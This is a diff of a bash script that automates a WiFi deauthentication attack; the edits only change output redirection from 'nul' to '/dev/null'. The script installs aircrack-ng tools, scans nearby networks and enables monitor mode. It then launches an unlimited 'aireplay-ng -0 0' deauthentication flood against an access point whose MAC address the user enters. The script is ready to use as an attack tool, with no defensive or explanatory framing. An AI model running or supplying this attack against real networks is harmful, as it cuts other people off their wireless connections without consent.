@@ -9,17 +9,17 @@ echo "checking for dependencies.."
 if [ ! -f '/usr/bin/aircrack-ng' ]
 then
 echo "loading aircrack.."
-sudo apt install aircrack-ng -y > nul
+sudo apt install aircrack-ng -y > /dev/null
 fi
 if [ ! -f '/bin/egrep' ]
 then
 echo "loading egrep.."
-sudo apt install egrep -y > nul
+sudo apt install egrep -y > /dev/null
 fi
 if [ ! -f '/sbin/iwlist' ]
 then
 echo "loading net-tools.."
-sudo apt install net-tools -y > nul
+sudo apt install net-tools -y > /dev/null
 fi
 echo "dependency check done.." && clear
 #end of dependencie check
@@ -48,13 +48,13 @@ sudo iwlist $inter scan | egrep 'Address|ESSID|Channel|Quality'
 echo "Choose Channel:"
 read chan
 echo "Please wait.. monitor mode is being enabled.."
-trap 'tput setaf 1 && echo "deactivating monitor mode.." && airmon-ng stop $inter\mon > nul && exit 1' INT
-sudo airmon-ng start $inter $chan > nul
+trap 'tput setaf 1 && echo "deactivating monitor mode.." && airmon-ng stop $inter\mon > /dev/null && exit 1' INT
+sudo airmon-ng start $inter $chan > /dev/null
 echo "MAC of Access-Point:"
 read macacc
 echo "loading attack..."
 tput setaf 1
 sudo aireplay-ng -0 0 -a $macacc -b $macacc $inter\mon
-sudo airmon-ng stop $inter\mon > nul
+sudo airmon-ng stop $inter\mon > /dev/null
 tput sgr0
 exit 0
